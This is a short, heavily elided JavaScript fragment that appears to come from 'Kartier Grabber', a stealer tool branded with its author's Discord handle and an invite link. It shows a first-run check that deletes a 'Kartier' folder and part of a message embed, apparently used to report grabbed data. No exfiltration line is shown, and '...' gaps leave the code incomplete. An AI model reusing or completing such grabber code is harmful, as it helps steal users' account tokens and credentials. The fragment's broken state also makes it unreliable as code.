...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Kartier"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Kartier"));
            ...
            embeds: [
                {
                    ...
                    "footer": {
                        "text": "Kartier Grabber By Kartierjay#0001・https://discord.gg/zwpWPcHyjt"
                    }
                }
            ]
        }
